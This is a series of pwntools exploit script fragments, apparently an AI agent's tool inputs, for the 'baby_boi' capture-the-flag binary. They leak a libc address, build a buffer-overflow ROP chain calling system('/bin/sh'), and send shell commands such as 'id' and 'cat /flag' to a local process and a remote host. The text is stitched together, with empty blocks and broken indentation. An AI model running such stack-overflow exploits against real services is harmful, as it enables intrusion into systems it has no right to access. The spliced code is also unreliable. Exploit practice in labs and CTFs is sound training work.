from pwn import *
import time
context.log_level='error'
io=process('./baby_boi')
io.recvuntil(b'Here I am: '); leak=int(io.recvline().strip(),16)
print('leak',hex(leak),'pid',io.pid)
for line in open(f'/proc/{io.pid}/maps'):
 if 'libc.so.6' in line: print(line.rstrip())
libcpath='/lib/x86_64-linux-gnu/libc.so.6'; l=ELF(libcpath,checksec=False)
print('host printf',hex(l.sym.printf),'system',hex(l.sym.system),'binsh',hex(next(l.search(b'/bin/sh\0'))))
base=(leak-l.sym.printf)&~0xfff
print('candidate base',hex(base),'offset',hex(leak-base),'aligned leak inferred',hex(leak-l.sym.printf))
payload=b'A'*40+p64(0x40054e)+p64(0x400793)+p64(base+next(l.search(b'/bin/sh\0')))+p64(base+l.sym.system)
io.sendline(payload); time.sleep(.2); print('poll',io.poll())
if io.poll() is None:

from pwn import *

libc=ELF('./libc-2.27.so',checksec=False)

  io=remote('172.19.0.2',8000,timeout=4)
  break

else: raise SystemExit('no connection')
io.recvuntil(b'Here I am: ')
leak=int(io.recvline().strip(),16); base=(leak-0x64e40)&~0xfff
print('leak/base',hex(leak),hex(base))
payload=b'A'*40+p64(0x40054e)+p64(0x400793)+p64(base+next(libc.search(b'/bin/sh\0')))+p64(base+libc.sym.system)
io.sendline(payload); sleep(.2); io.sendline(b'echo REMOTE_OK; id; ls /')
print('response',repr(io.recvrepeat(2)))
PY", "timeout_seconds": 20}

from pwn import *
context.log_level='debug'
libc=ELF('./libc-2.27.so',checksec=False)
io=remote('172.19.0.2',8000,timeout=4)
io.recvuntil(b'Here I am: ')
leak=int(io.recvline().strip(),16)
base=(leak-0x64e40)&~0xfff
print('leak/base',hex(leak),hex(base),'page offset',hex(leak-base))
print('system/binsh',hex(base+libc.sym.system),hex(base+next(libc.search(b'/bin/sh\0'))))
payload=b'A'*40+p64(0x40054e)+p64(0x400793)+p64(base+next(libc.search(b'/bin/sh\0')))+p64(base+libc.sym.system)
io.sendline(payload)
sleep(.2)
io.sendline(b'echo REMOTE_OK; id; cat /flag 2>/dev/null; cat flag 2>/dev/null')
print(repr(io.recvrepeat(2)))
io.close()
PY", "timeout_seconds": 15}

line=io.recvline(timeout=3); print('line2:',repr(line))
leak=int(line.strip().split()[-1],16)
libc=ELF('./libc-2.27.so',checksec=False)
base=leak-libc.sym.printf
print('leak=%#x base=%#x system=%#x binsh=%#x'%(leak,base,base+libc.sym.system,base+next(libc.search(b'/bin/sh\0'))))
payload=b'A'*40+p64(0x40054e)+p64(0x400793)+p64(base+next(libc.search(b'/bin/sh\0')))+p64(base+libc.sym.system)
io.sendline(payload)
io.sendline(b'echo REMOTE_OK; cat flag*; cat /flag*')
try:

except Exception as e: print('recv err',e)
io.close()
